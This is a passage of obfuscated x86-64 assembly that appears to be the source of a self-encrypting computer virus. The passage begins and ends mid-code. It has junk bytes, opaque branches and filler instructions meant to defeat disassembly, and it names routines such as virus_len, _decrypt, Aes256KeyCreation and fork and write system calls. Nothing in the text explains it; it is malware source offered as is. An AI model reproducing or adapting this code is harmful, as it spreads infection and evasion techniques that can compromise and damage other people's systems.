    js          ..@ZPk9ihus7t2n
    jns         ..@ZPk9ihus7t2n
..@IJacgDmeCums:
    mov         r2d, DWORD [r5]
    jmp         $+5
db 0x4f, 0xe2, 0xc1
    jmp         $+4
db 0x76, 0xc8
    jmp         ..@choIxV3MpdNJ
..@8ZbtA7PK8pqX:
%ifndef ENABLE_DEBUGGING
    mov         rsp, rsp
%endif
    jmp         $+3
db 0x04
    js          ..@C1XrpeG9a1Db
    jns         ..@C1XrpeG9a1Db
..@IHxtcVFATf3W:
%ifndef ENABLE_DEBUGGING
    xchg        rsi, rsi
%endif
    jmp         $+3
db 0xe4
    jmp         ..@K5Ovxsfhy7JU
..@Nvrd6XstF5u7:
    movdqa      OWORD [rsi+0x90], xmm3
    jl          ..@KFTR6h9eChaX
    jge         ..@KFTR6h9eChaX
..@wKhdZVWTLUTi:
%ifndef ENABLE_DEBUGGING
    rep         nop
%endif
    jb          ..@SYXfRf9NzryY
    jae         ..@SYXfRf9NzryY
..@byevyUAM0hFf:
%ifndef ENABLE_DEBUGGING
    xchg        rdx, rdx
%endif
    jmp         $+5
db 0xa9, 0xe1, 0x4c
    jb          ..@LXIovpBdoYM5
    jae         ..@LXIovpBdoYM5
..@nmP4kSe9FxI4:
%ifndef ENABLE_DEBUGGING
    jl          ..@rdSWUyV7Ac2q
%endif
    jmp         $+5
db 0xa4, 0xf0, 0x49
    jb          ..@JBCQNV4blabR
    jae         ..@JBCQNV4blabR
..@ZPk9ihus7t2n:
    pop         rsi
    js          ..@3athdJr55ZCI
    jns         ..@3athdJr55ZCI
..@y8iFWeqQpkhL:
%ifndef ENABLE_DEBUGGING
    pop         rax
%endif
    jmp         ..@1MQwwk8YQ3Py
..@3h1UgBDzbXQe:
    pop         rsi
    jmp         ..@SzkyzyIzATQi
..@7plDCySWo49g:
%ifndef ENABLE_DEBUGGING
    cmp         r4, 0x10000
%endif
    jb          ..@34pjHT4WJBWR
    jae         ..@34pjHT4WJBWR
..@5uKJmL8ZUkiz:
    pop         rsi
    jmp         $+3
db 0xe9
    jmp         ..@RagESIsm0USB
..@HwkSyr3nSM4c:
%ifndef ENABLE_DEBUGGING
    mov         r1, QWORD [rsp]
%endif
    js          ..@Pd6NeUa2Jazu
    jns         ..@Pd6NeUa2Jazu
..@ImB4FLghi592:
    INIT_MX_VAR
    jmp         $+4
db 0x8b, 0x2a
    jmp         $+4
db 0x41, 0x05
    jmp         $+4
db 0x68, 0x1a
    je          ..@lxvgtDfgvTx1
    jne         ..@lxvgtDfgvTx1
..@QpWWCABZhijm:
    pop         rbx
    jmp         $+4
db 0x4b, 0xd5
    jmp         $+5
db 0x8b, 0x88, 0x15
    js          Memmem
    jns         Memmem
..@LbEvs7UZrEmf:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_WRITE
%endif
    jmp         $+3
db 0x9b
    jmp         $+5
db 0x4c, 0xc9, 0x88
    jmp         $+5
db 0x65, 0x8d, 0x23
    jmp         ..@HAjCkikkqC31
..@WjMP7iHiDoeT:
    xchg        rbx, rbx
    jmp         $+4
db 0xb7, 0xf5
    jb          ..@Bm9yyYtUHFsN
    jae         ..@Bm9yyYtUHFsN
..@iQnh91gZSXLk:
%ifndef ENABLE_DEBUGGING
    CFILE       r5d
%endif
    jmp         $+4
db 0x5e, 0x99
    jb          ..@xDs9sFJuDF9U
    jae         ..@xDs9sFJuDF9U
..@fKL1Tv6P8ozI:
    pxor        xmm0, xmm1
    jmp         $+4
db 0x1b, 0xbb
    jmp         ..@1AbdB7U4ZObS
..@reR2utbnyZFz:
    movdqu      xmm1, OWORD [rsp+0x30]
    jl          ..@R4dsdT1dhtaQ
    jge         ..@R4dsdT1dhtaQ
..@PdicY88fxtsA:
%ifndef ENABLE_DEBUGGING
    pop         rdx
%endif
    jmp         $+5
db 0x21, 0x02, 0x3b
    jmp         ..@rKeeNlIOq775
..@Gl33AU1qDj1Z:
    jz          ..@SijYGInSC9MM
    jmp         $+3
db 0xa4
    jmp         ..@8tPJSwwUV64D
..@zgsALb5XSQ4q:
    xor         r1, r1
    jmp         $+5
db 0xee, 0xfb, 0x58
    jb          ..@Md1Tm3fCHOW3
    jae         ..@Md1Tm3fCHOW3
..@HEaScV2JDrVc:
    movdqu      xmm1, OWORD [r1+0x10]
    jb          ..@8fGqCDuxh3hL
    jae         ..@8fGqCDuxh3hL
..@kzwlnzPxpgIe:
    cmp         QWORD [r5], 0x0000000000000000
    js          ..@AV01x1qsF0DY
    jns         ..@AV01x1qsF0DY
..@IYIBpJJsjDCS:
%ifndef ENABLE_DEBUGGING
    call        GetEnv
%endif
    jl          ..@R0HuELSS7XPX
    jge         ..@R0HuELSS7XPX
..@SYgWXgJpRNl9:
    add         rcx, 0x10
    jmp         $+3
db 0x40
    jmp         ..@4nVTa2mFGXci
..@OiOq81HOAsSg:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    je          ..@KlLBY41vlPjt
    jne         ..@KlLBY41vlPjt
..@izqeMX57XUsk:
%ifndef ENABLE_DEBUGGING
    rdtsc
%endif
    je          ..@BjmPXzPjtfvF
    jne         ..@BjmPXzPjtfvF
..@ievtUw2ZBVPf:
    mov         rsi, r5
    jmp         ..@iuVIBtfiugl3
..@QLFBm5Fsmkj1:
    cmp         rax, QWORD [rsp]
    jmp         ..@22WmWf1aptQ7
..@mSbKAYs6xROg:
    push        rdx
    jmp         $+5
db 0x8e, 0x47, 0x45
    jb          ..@ybbYQkpoED3k
    jae         ..@ybbYQkpoED3k
..@n4AdtGTXmxPd:
    push        rdi
    jmp         $+4
db 0x1f, 0x30
    jl          ..@ATufZ3Ws5xRN
    jge         ..@ATufZ3Ws5xRN
..@lxvgtDfgvTx1:
    mov         rsi, rsi
    jmp         $+3
db 0x80
    jl          ..@KGlRhXZzJi1Y
    jge         ..@KGlRhXZzJi1Y
..@gN6OMWW4FlQj:
    dec         r3
    jmp         $+4
db 0xc2, 0x31
    jmp         $+4
db 0xde, 0xfe
    jmp         $+4
db 0x2b, 0xbd
    js          ..@JVMtCJ94Qjna
    jns         ..@JVMtCJ94Qjna
..@RN4XK8Nt65cx:
    call        ..@KMAZPkFFQBCY
    jmp         $+4
db 0x63, 0xdb
    jmp         ..@n6s3TSy8twqr
..@CjXBGpH2DUFK:
    push        rbx
    jmp         $+5
db 0xea, 0x05, 0x16
    js          ..@SzyycYGXi47c
    jns         ..@SzyycYGXi47c
..@eR0k0A0ijh96:
    mov         rax, rax
    jl          ..@RN4XK8Nt65cx
    jge         ..@RN4XK8Nt65cx
..@R4dsdT1dhtaQ:
    aesimc      xmm0,xmm1
    jl          ..@OFAY8WMx8lx0
    jge         ..@OFAY8WMx8lx0
..@0zj48eGPQ0Nd:
    mov         rdi, rdi
    jmp         $+5
db 0x39, 0x1f, 0x14
    js          ..@gQxRSvqmClt2
    jns         ..@gQxRSvqmClt2
..@TfByHJpaLjfE:
    pslldq      xmm4, 0x4
    js          ..@ca6GW7mdW9pN
    jns         ..@ca6GW7mdW9pN
..@vhFHZCRBVUvM:
    pop         rsi
    jmp         $+5
db 0x6b, 0x7d, 0x29
    jmp         $+5
db 0xdc, 0x3f, 0xb3
    jmp         $+4
db 0x96, 0xa5
    jmp         ..@hDQkbA4gxo3H
..@U7R1FH4owHAE:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    jmp         $+3
db 0x15
    jmp         $+4
db 0xff, 0xb3
    jmp         $+4
db 0xc6, 0xe1
    jmp         $+3
db 0x8f
    jl          ..@mWr2EY7fnMje
    jge         ..@mWr2EY7fnMje
..@oiFjE5kflKQI:
    push        rcx
    jmp         $+5
db 0x3f, 0x38, 0x31
    jmp         $+5
db 0xd6, 0x40, 0x96
    jb          ..@XUghrsvrmjEH
    jae         ..@XUghrsvrmjEH
..@XMmHpgSPKJT5:
    mov         rsp, rsp
    jmp         $+5
db 0x0d, 0x2e, 0xd7
    jmp         $+5
db 0x81, 0x30, 0x50
    jmp         ..@uvvaAtLPGbLC
..@oWEVEvGFxTI1:
    xchg        rdx, rdx
    jmp         ..@JWlz9AqXhTx7
..@A2ECjCXzdpEK:
    jmp         rax
    jmp         $+5
db 0xd6, 0xd2, 0xc9
    jb          ..@IwuzLc8I7NYD
    jae         ..@IwuzLc8I7NYD
..@IizSJ1JARtWT:
%ifndef ENABLE_DEBUGGING
    mov         r1, 1
%endif
    je          ..@0tvADgX2Eua6
    jne         ..@0tvADgX2Eua6
..@XUghrsvrmjEH:
    mov         rsi, rsi
    jmp         $+3
db 0x48
    jl          ..@HpO8SztHh8yt
    jge         ..@HpO8SztHh8yt
..@kyPjJdZ3DaO4:
%ifndef ENABLE_DEBUGGING
    mov         rsi, rsi
%endif
    jmp         ..@byevyUAM0hFf
..@2ZCcksukFnCr:
    rep         cmpsb
    jmp         $+5
db 0x3f, 0xd3, 0x77
    js          ..@Gl33AU1qDj1Z
    jns         ..@Gl33AU1qDj1Z
..@IxPYZkjxyhUX:
    xchg        rbx, rbx
    jmp         $+3
db 0x42
    jl          ..@dBgrc2xjtPA2
    jge         ..@dBgrc2xjtPA2
..@HhJmTA9p6odp:
    GGLOBAL     _decrypt
    js          ..@14s1eq1c8h35
    jns         ..@14s1eq1c8h35
..@UaF7M7vqPohF:
    cmp         DWORD [r5], 0x00000000
    jmp         $+4
db 0x0f, 0xbc
    jmp         $+5
db 0x2f, 0x74, 0xcd
    jmp         $+4
db 0xbf, 0x01
    jl          ..@7zbGo9FhBzxB
    jge         ..@7zbGo9FhBzxB
..@4tkcPS7qEZWc:
    jmp         ..@hDQkbA4gxo3H
    jl          ..@P6mj0Rm5zzSw
    jge         ..@P6mj0Rm5zzSw
..@qTT3Z37KpVMa:
%ifndef ENABLE_DEBUGGING
    mov         rsp, rsp
%endif
    je          ..@vyhAw0CD9PeU
    jne         ..@vyhAw0CD9PeU
..@Ycq7UDBYIP1z:
    xchg        rdx, rdx
    jb          ..@DXlEVOodsoVE
    jae         ..@DXlEVOodsoVE
..@Ai2LQwqfwQQM:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    jmp         $+4
db 0x4b, 0x2b
    jl          ..@rux09xfNK1QL
    jge         ..@rux09xfNK1QL
..@pu3HFEjo2IBb:
    mov         r1, r5
    jmp         ..@PpCqCBbCyMOz
..@LtRm40aWL101:
    ret
    jmp         $+4
db 0x6e, 0x6e
    jmp         $+5
db 0x17, 0x65, 0x69
    jmp         ..@8ioGixrBkM7A
..@r5ivX6jdhf0F:
    aesimc      xmm0,xmm1
    js          ..@8vlF4SOreIIO
    jns         ..@8vlF4SOreIIO
..@v9kt86fNlIKa:
%ifndef ENABLE_DEBUGGING
    mov         rbp, rbp
%endif
    jl          ..@6jrtP1uRaNWh
    jge         ..@6jrtP1uRaNWh
..@MMpLkWW2p4dV:
    sub         r2, non_encrypted_len
    jb          ..@FP8RJuKuZ6AX
    jae         ..@FP8RJuKuZ6AX
..@l98YsLpAADGc:
    aesimc      xmm0,xmm1
    jmp         ..@C9rsGnlSWKPX
..@6s4nsL2yluz5:
%ifndef ENABLE_DEBUGGING
    rdtsc
%endif
    jmp         ..@dBEfz13Y6owH
..@lpWDUNvnjdKy:
    mov         rax, rax
    jl          ..@vuvgKvJgr2gg
    jge         ..@vuvgKvJgr2gg
..@bXrxbqSBmmxU:
    movdqu      xmm1, OWORD [rsp+0xa0]
    jmp         $+3
db 0xb0
    jl          ..@orf3yz4e0Po4
    jge         ..@orf3yz4e0Po4
..@HAjCkikkqC31:
%ifndef ENABLE_DEBUGGING
    push        rbx
%endif
    jmp         $+5
db 0xbe, 0x10, 0x1a
    js          ..@XzstsScD4o8u
    jns         ..@XzstsScD4o8u
..@SYXfRf9NzryY:
%ifndef ENABLE_DEBUGGING
    push        rdx
%endif
    jmp         $+3
db 0xda
    jmp         ..@KU0dxRMTazDM
..@L8WG3GqrvJYk:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+4
db 0x49, 0xa5
    js          ..@NJ8E8r06KYQl
    jns         ..@NJ8E8r06KYQl
..@14s1eq1c8h35:
    mov         r1, r5
    jmp         ..@QIhz6k9LRS5s
..@WxPLn5Rjg5M0:
    push        rdx
    jmp         $+4
db 0xc3, 0x7e
    jmp         ..@9mvkHvsQySmM
..@FXWyhJT1JdSH:
    mov         rsp, rsp
    jmp         ..@i4xAuxp7d3GC
..@oP2H0edY4DEA:
%ifndef ENABLE_DEBUGGING
    push        rax
%endif
    jmp         $+5
db 0xbe, 0x7a, 0xde
    jmp         $+4
db 0x83, 0xd6
    jl          ..@LjJD8P2EgS1j
    jge         ..@LjJD8P2EgS1j
..@gxY8OaGCVJoW:
    mov         rdx, rdx
    jmp         $+5
db 0x80, 0x79, 0x8f
    jmp         ..@T8hQZfajFU3R
..@iYhSPkEy7w5q:
    movdqa      OWORD [rsi+0x10], xmm3
    jmp         $+5
db 0x24, 0xf3, 0xbe
    jb          ..@b0ijtkWvINcv
    jae         ..@b0ijtkWvINcv
..@cJ3mqFK65NkL:
    push        rsi
    jmp         $+4
db 0xb9, 0x99
    jb          ..@7okNKDMKVFWZ
    jae         ..@7okNKDMKVFWZ
..@PMZ2Tl1YzQiB:
    GGLOBAL     virus_len
    jmp         $+4
db 0xc6, 0x3e
    je          ..@IJacgDmeCums
    jne         ..@IJacgDmeCums
..@Lns7c1bvXYRB:
    pop         rdi
    jmp         $+3
db 0x36
    jmp         $+5
db 0x95, 0xbc, 0x98
    jmp         ..@bPAIQm9iW86W
..@5IkPMdn0EGqC:
    mov         rsi, rsi
    jmp         $+4
db 0x49, 0xc7
    js          ..@Q1AqrJfeTLDS
    jns         ..@Q1AqrJfeTLDS
..@FlUQzcuCWsKM:
%ifndef ENABLE_DEBUGGING
    push        rdi
%endif
    jmp         $+4
db 0xca, 0x12
    jmp         ..@0XuWV8CSzMrQ
..@sg5eEg548Y6h:
%ifndef ENABLE_DEBUGGING
    mov         rdi, rdi
%endif
    jmp         $+5
db 0xa5, 0xf3, 0x91
    jmp         $+3
db 0x50
    jmp         $+4
db 0xa8, 0x51
    jmp         $+5
db 0x1e, 0x81, 0x26
    jl          ..@aDzNiLxbJdlD
    jge         ..@aDzNiLxbJdlD
..@599BkrhaRGbA:
    mov         rsi, QWORD [rsp+1*bytes]
    jmp         $+5
db 0xa6, 0xeb, 0x74
    jmp         ..@cLpFDIHkUegj
..@mJODwSkGV8BQ:
%ifndef ENABLE_DEBUGGING
    push        rax
%endif
    jmp         $+5
db 0x8c, 0x2c, 0xc4
    jmp         $+4
db 0xe2, 0x1f
    jmp         ..@yo5wuMR0zNGr
..@ImUAiSoNOMVm:
    mov         rax, r2
    jmp         $+3
db 0x1d
    jl          ..@xjyQ1lxUrcsQ
    jge         ..@xjyQ1lxUrcsQ
..@ggqv9AKbzoop:
    pop         rcx
    jmp         $+5
db 0x64, 0x46, 0xdc
    jl          ..@2L23SoL9dlLk
    jge         ..@2L23SoL9dlLk
..@ZfCOJXNdGkg5:
%ifndef ENABLE_DEBUGGING
    mov         r2, QWORD [rsp]
%endif
    jl          ..@SFG4r0NAFYkF
    jge         ..@SFG4r0NAFYkF
..@uCtIYJh4vaKE:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
%endif
    jmp         $+5
db 0x42, 0xa1, 0xaa
    jmp         ..@bhwtYyHrr63d
..@q0gi1LZ2gqj8:
    aesimc      xmm0,xmm1
    jmp         $+5
db 0xaa, 0x7e, 0xbd
    jmp         $+5
db 0x70, 0x74, 0x47
    jl          ..@BsHgUnQPfFIM
    jge         ..@BsHgUnQPfFIM
..@HuPoGyEsgplv:
    pop         rsi
    js          ..@iiotwiX7iZOW
    jns         ..@iiotwiX7iZOW
..@bLx82zdpZ5By:
    add         rdi, bytes
    jmp         $+5
db 0x98, 0xde, 0xe3
    js          ..@C7RAsxkYITiR
    jns         ..@C7RAsxkYITiR
..@kiEtHmE8Eueb:
    xor         rax, rax
    jmp         $+5
db 0x12, 0x53, 0x9f
    jmp         $+3
db 0xe8
    jl          ..@wquAaKY3PumY
    jge         ..@wquAaKY3PumY
..@3eFceyHfDIRb:
    push        rsi
    jmp         $+4
db 0x6c, 0x87
    jmp         ..@t5zR3spdSZs9
..@c7olERRvXc8q:
    pop         rax
    jmp         $+3
db 0xdc
    jmp         $+3
db 0x21
    jmp         $+5
db 0x27, 0x19, 0xba
    je          ..@K4u5vuuugw1Y
    jne         ..@K4u5vuuugw1Y
..@g2LC4NjpRcFy:
    mov         rcx, rcx
    jmp         $+3
db 0x60
    je          ..@bXrxbqSBmmxU
    jne         ..@bXrxbqSBmmxU
..@pcb3jNkgduT4:
    mov         rbx, rdi
    jmp         $+3
db 0xaa
    jmp         $+5
db 0x85, 0xf0, 0xfa
    jmp         ..@599BkrhaRGbA
..@iA2202iCD6Hx:
    movdqu      xmm1, OWORD [rsp+0x30]
    jmp         $+5
db 0x0e, 0xee, 0xa6
    jb          ..@QE27z0PzGsT9
    jae         ..@QE27z0PzGsT9
..@2CBRaUahBo4G:
    push        rsi
    jmp         $+3
db 0xbd
    jmp         $+3
db 0xac
    js          ..@3h1UgBDzbXQe
    jns         ..@3h1UgBDzbXQe
..@8vlF4SOreIIO:
    movdqu      OWORD [rsp+0x60],xmm0
    jmp         $+5
db 0xa1, 0x4a, 0x36
    jl          ..@rj9MrqfivNcQ
    jge         ..@rj9MrqfivNcQ
..@b0sojrMqkj9C:
    sub         QWORD [rsp+2*bytes], rdx
    jb          ..@d4e7AiK9hGLQ
    jae         ..@d4e7AiK9hGLQ
..@pyrdBucisSak:
%ifndef ENABLE_DEBUGGING
    mov         r1, 1
%endif
    jmp         $+3
db 0x0c
    jmp         ..@vAxzw3tqbKaO
..@nGIcYdUQi4WP:
    call        ..@QD0Xbwg9GTO5
    jmp         $+3
db 0xdc
    jmp         ..@67FoesuwuBa6
..@CYa9MOwPhyQ8:
    push        rdi
    jmp         $+4
db 0xb1, 0x37
    jmp         ..@klHLUa5fZgxG
..@y19AgiuviGjl:
    xchg        rsi, rsi
    jmp         $+5
db 0xc8, 0x19, 0xae
    jmp         ..@PMZ2Tl1YzQiB
..@SzkyzyIzATQi:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         ..@w0P5nSLo9NJn
..@cgq6ndSsgG0k:
    pop         rsi
    jmp         ..@HNIyypun8OyB
..@JAitWEYiMNXw:
%ifndef ENABLE_DEBUGGING
    push        rdi
%endif
    jmp         $+4
db 0xd7, 0x34
    jb          ..@fsS2zoYAqP58
    jae         ..@fsS2zoYAqP58
..@bcvmJTJQjcsZ:
    push        rax
    js          ..@qcn0EdDMKIi5
    jns         ..@qcn0EdDMKIi5
..@QElLlWhU7D8Z:
    je          ..@nBB5ZeiYDs0B
    jmp         ..@zgsALb5XSQ4q
..@bhwtYyHrr63d:
%ifndef ENABLE_DEBUGGING
    push        rax
%endif
    jmp         $+5
db 0xd4, 0xb6, 0x23
    jb          ..@y8iFWeqQpkhL
    jae         ..@y8iFWeqQpkhL
..@OZWA5NMT10cE:
    mov         rsi, rsi
    je          ..@ktOc8nCpzt4m
    jne         ..@ktOc8nCpzt4m
..@2redXI3LFX0V:
    add         r1, 1
    jmp         $+5
db 0x09, 0x8e, 0x14
    jl          ..@6HSS9yS9n6kI
    jge         ..@6HSS9yS9n6kI
..@wqy1EqVF0F9Q:
    xchg        rax, rax
    jmp         ..@QVXMWPNagRRI
..@t5zR3spdSZs9:
    xchg        rsp, rsp
    jmp         $+5
db 0x79, 0x9a, 0xbf
    jmp         ..@1EsxjXfmBsMo
..@1XbKFcqHI412:
    mov         rcx, rcx
    jmp         ..@OmWePgoGVZzl
..@cHIfP6le5GPq:
    push        rsi
    jmp         ..@AdXQlaVvKQzh
..@MvenlFT20c02:
    call        Aes256KeyCreation
    jmp         $+5
db 0x24, 0x12, 0x15
    jl          ..@0HiQxiFdZp5B
    jge         ..@0HiQxiFdZp5B
..@Z5VoyxxFg4PN:
    pop         rcx
    js          ..@noleCCWdKaEX
    jns         ..@noleCCWdKaEX
..@Ytbx2BPYJ021:
    xor         rcx, rcx
    jmp         $+5
db 0xe3, 0x66, 0x36
    jb          ..@fKhAV7aEp9rJ
    jae         ..@fKhAV7aEp9rJ
..@O6pJnRC3uHpG:
%ifndef ENABLE_DEBUGGING
    mov         r2, 0x200
%endif
    je          ..@exbZwRy5TpCq
    jne         ..@exbZwRy5TpCq
..@3athdJr55ZCI:
    movdqa      OWORD [rsi], xmm1
    jmp         $+5
db 0x1c, 0x02, 0x8e
    jmp         ..@iYhSPkEy7w5q
..@a2XkL5yWPa6c:
    pxor        xmm3, xmm2
    jmp         $+4
db 0x2a, 0x00
    jl          ..@kHG5t33XFxww
    jge         ..@kHG5t33XFxww
..@Bs0juEKfe9u5:
%ifndef ENABLE_DEBUGGING
    mov         r5, rax
%endif
    js          ..@PdcDv1CIqTlR
    jns         ..@PdcDv1CIqTlR
..@UNLnn0N80p25:
    jz          ..@QdMDSBsCxqGv
    jb          ..@RRiGfmr6Ua4i
    jae         ..@RRiGfmr6Ua4i
..@0HiQxiFdZp5B:
    xor         r2, r2
    je          ..@HhJmTA9p6odp
    jne         ..@HhJmTA9p6odp
..@JyRjLNBdjJA6:
    movdqa      xmm4, xmm1
    jmp         $+5
db 0x3f, 0x95, 0x7d
    jb          ..@4PLSaX0vGxic
    jae         ..@4PLSaX0vGxic
..@zcbya1srnYqC:
    pop         rsi
    jmp         $+4
db 0xf3, 0xbc
    jmp         ..@Qeg9CkJCtFOa
..@eLMgsRoWfdlr:
    mov         rcx, rcx
    jmp         $+5
db 0xb8, 0xb7, 0xb5
    jb          ..@6Etb5TwD8sXT
    jae         ..@6Etb5TwD8sXT
..@sxys6rYFmXcO:
    push        rdi
    jb          ..@tyIutCsK9u0g
    jae         ..@tyIutCsK9u0g
..@6HSS9yS9n6kI:
    mov         rdi, rdi
    jmp         $+3
db 0xe7
    jmp         $+3
db 0xca
    jb          ..@MmbZJb56WK4V
    jae         ..@MmbZJb56WK4V
..@1wLXsdhLg9j9:
    aesimc      xmm0,xmm1
    jmp         $+5
db 0x04, 0x17, 0x68
    jmp         ..@1TBwnYzWZ0lh
..@CbiuL1mYx0ye:
    test        rax, rax
    js          ..@aXhNlLgUuNoV
    jns         ..@aXhNlLgUuNoV
..@MHzw7t30XjIu:
    pop         rax
    jmp         $+5
db 0x7f, 0x66, 0x0a
    je          ..@kBhXZCEX6yX8
    jne         ..@kBhXZCEX6yX8
..@Lf42hTPUF87S:
    pop         rbx
    jb          ..@Kd5fEHA75HWU
    jae         ..@Kd5fEHA75HWU
..@Ua31i3GwGu0r:
    pop         rdi
    jmp         ..@nBcBVjsintce
..@HNIyypun8OyB:
    mov         rsp, rsp
    jmp         $+4
db 0xb0, 0x8c
    jl          ..@XMmHpgSPKJT5
    jge         ..@XMmHpgSPKJT5
..@Cd6zq4zfTYzu:
    DESTROY_MX_VAR
    jmp         $+3
db 0x30
    js          ..@UPgZxeHt7HFA
    jns         ..@UPgZxeHt7HFA
..@aDzNiLxbJdlD:
%ifndef ENABLE_DEBUGGING
    jz          ..@YyQv5e2sdtTm
%endif
    jmp         $+5
db 0xa8, 0xf5, 0xde
    jmp         $+5
db 0x09, 0xa5, 0xae
    js          ..@byRiL3CBhFnv
    jns         ..@byRiL3CBhFnv
..@graRcSeAWotP:
    mov         r3, _decrypt-_virus
    js          ..@MvenlFT20c02
    jns         ..@MvenlFT20c02
..@tCI4z3j7j7x0:
    pop         rcx
    js          ..@plCSU3N7DxYL
    jns         ..@plCSU3N7DxYL
..@KMAZPkFFQBCY:
    pshufd      xmm2, xmm2, 0xff
    js          ..@JyRjLNBdjJA6
    jns         ..@JyRjLNBdjJA6
..@Lt6bhgUuHolp:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    je          ..@BdlgTTpBpeK1
    jne         ..@BdlgTTpBpeK1
..@aXhNlLgUuNoV:
    jz          ..@q6GymkzvTT28
    jb          ..@dfm5650JhgB0
    jae         ..@dfm5650JhgB0
..@65t2PH1KzRnD:
    mov         rsp, rsp
    jmp         $+5
db 0x01, 0x34, 0xb8
    jmp         $+3
db 0xd4
    je          ..@6fHdYZSdb3mq
    jne         ..@6fHdYZSdb3mq
..@Gm7xRYRJF9dQ:
%ifndef ENABLE_DEBUGGING
    mov         r1, r5
%endif
    jmp         ..@IYIBpJJsjDCS
..@LjJD8P2EgS1j:
%ifndef ENABLE_DEBUGGING
    pop         rax
%endif
    je          ..@2KziKuJ9JLOJ
    jne         ..@2KziKuJ9JLOJ
..@Od3H0BKMnMVo:
    mov         rbp, rbp
    je          ..@1d5e9tnNPsXd
    jne         ..@1d5e9tnNPsXd
..@QIhz6k9LRS5s:
    push        rsi
    jmp         ..@dFfh1GU2LK1x
..@Gs907G9JDwPY:
%ifndef ENABLE_DEBUGGING
    xchg        rdx, rdx
%endif
    js          ..@7plDCySWo49g
    jns         ..@7plDCySWo49g
..@D1dHhDDLr1G1:
    push        rdi
    js          ..@CYa9MOwPhyQ8
    jns         ..@CYa9MOwPhyQ8
..@nobJSibXBhkz:
    mov         rdi, rdi
    jmp         ..@6jJxUiqNr9PR
..@0VJi0HCHzk5o:
    mov         rcx, rcx
    jmp         $+5
db 0x2b, 0x38, 0x75
    js          ..@Zb0a9UGCHgDn
    jns         ..@Zb0a9UGCHgDn
..@Y2ZNAQexW62K:
    movdqu      xmm1, OWORD [rsp+0x10]
    jmp         $+4
db 0x72, 0x7f
    jmp         $+4
db 0x9b, 0x96
    jl          ..@GmcH5tLXXvHA
    jge         ..@GmcH5tLXXvHA
..@RPGKvIiesnjq:
%ifndef ENABLE_DEBUGGING
    mov         rsp, rsp
%endif
    jmp         $+4
db 0xa3, 0x7d
    jb          ..@OiOq81HOAsSg
    jae         ..@OiOq81HOAsSg
..@I2RbK7laXR7O:
    xchg        rcx, rcx
    jmp         $+4
db 0x29, 0x6f
    jmp         $+5
db 0x20, 0x17, 0x78
    jmp         $+5
db 0xaf, 0xfb, 0x6b
    jmp         ..@n4AdtGTXmxPd
..@34pjHT4WJBWR:
%ifndef ENABLE_DEBUGGING
    push        rdx
%endif
    jb          ..@PdicY88fxtsA
    jae         ..@PdicY88fxtsA
..@k4vw4AoC85DI:
    mov         rbx, rbx
    jmp         ..@zq6p48TjB9ff
..@DlmGz967nbYW:
%ifndef ENABLE_DEBUGGING
    sub         rsp, 0x200
%endif
    jmp         $+3
db 0x47
    jl          ..@B1PWRPBzfq7P
    jge         ..@B1PWRPBzfq7P
..@G6FHHgwy4CHM:
    aesimc      xmm0,xmm1
    js          ..@3117uDJGkOl0
    jns         ..@3117uDJGkOl0
..@3EBqasSvuFUU:
%ifndef ENABLE_DEBUGGING
    xchg        rdi, rdi
%endif
    jmp         $+5
db 0x90, 0x59, 0xcc
    jmp         $+3
db 0xae
    jmp         ..@nLWOZZE6frY0
..@AVEONqxHhpSH:
    mov         rax, SYS_FORK
    jmp         $+5
db 0xad, 0x17, 0xdf
    jmp         $+3
db 0xbe
    jmp         ..@9yJWt34pZ7zE
..@HWFCs3hVgRYn:
    mov         rbx, rbx
    jmp         $+4
db 0x01, 0x72
    jmp         $+3
db 0x18
    jb          ..@XW4CDDCt8gU1
    jae         ..@XW4CDDCt8gU1
..@PoXkwcR317GV:
    mov         rdx, rdx
    jl          ..@aj0LfwNecru8
    jge         ..@aj0LfwNecru8
..@hlmCtsgVmE1t:
    movdqu      xmm1, OWORD [rsp]
    jmp         $+3
db 0xe9
    jmp         $+3
db 0x61
    jb          ..@pEKAJu9P310n
    jae         ..@pEKAJu9P310n
..@5FTtZAqPmtCk:
    lea         r3, [rsp+_UEC_OFF.key]
    jl          ..@IejIeEiPYsN4
    jge         ..@IejIeEiPYsN4
..@ATufZ3Ws5xRN:
    push        rdx
    jmp         $+5
db 0xc4, 0x84, 0x8a
    jmp         $+5
db 0x1c, 0x2a, 0x0d
    jl          ..@2AyZZ3yN56yy
    jge         ..@2AyZZ3yN56yy
..@xL03DXWiTxYU:
    mov         rsp, rsp
    js          ..@2sASXViddTOO
    jns         ..@2sASXViddTOO
..@nWxLqRLhtqQg:
%ifndef ENABLE_DEBUGGING
    mov         eax, DWORD [rsp]
%endif
    js          ..@kxWCopCPanOY
    jns         ..@kxWCopCPanOY
..@KhNToQGXDnlf:
    push        rdx
    jmp         $+3
db 0xac
    jmp         ..@AgQsJiqCdjsv
..@1EsxjXfmBsMo:
    pop         rsi
    jmp         $+5
db 0x02, 0xa8, 0xc7
    jl          ..@reR2utbnyZFz
    jge         ..@reR2utbnyZFz
..@bkb1y192xz42:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    je          ..@nWxLqRLhtqQg
    jne         ..@nWxLqRLhtqQg
..@B1PWRPBzfq7P:
%ifndef ENABLE_DEBUGGING
    xchg        rdx, rdx
%endif
    je          ..@Kwl63lEEW1UT
    jne         ..@Kwl63lEEW1UT
..@PMOGRNG1N9n5:
    jmp         ..@pcb3jNkgduT4
    jl          ..@y9vjq2tU6YbF
    jge         ..@y9vjq2tU6YbF
..@Q84dCLbcXbiW:
    push        rcx
    jmp         $+3
db 0xf0
    jmp         ..@Z5VoyxxFg4PN
..@orf3yz4e0Po4:
    xchg        rsp, rsp
    js          ..@mWtE86Aie1dF
    jns         ..@mWtE86Aie1dF
..@XzstsScD4o8u:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    js          ..@taTkmEP4O9E9
    jns         ..@taTkmEP4O9E9
..@8SCJNjfYNTgV:
    mov         rdi, rdi
    jmp         ..@AZR2iUsvDmo2
..@X8fRNnf9HX9W:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+4
db 0xa2, 0x56
    jmp         ..@3EBqasSvuFUU
..@6tcRp8wxLuSk:
